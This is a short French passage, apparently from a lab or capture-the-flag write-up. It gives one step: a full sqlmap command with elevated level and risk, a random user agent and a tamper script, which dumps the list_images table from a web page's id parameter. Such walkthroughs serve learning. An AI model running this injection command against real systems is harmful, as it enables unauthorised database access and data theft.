...
- Faire `sqlmap -u http://10.74.2.235/?page=searchimg\&id=2\&Submit=Submit\ --level 3 --risk 3 --random-agent --tamper space2comment -D Member_images -T list_images --dump` pour avoir le contenu des colonnes
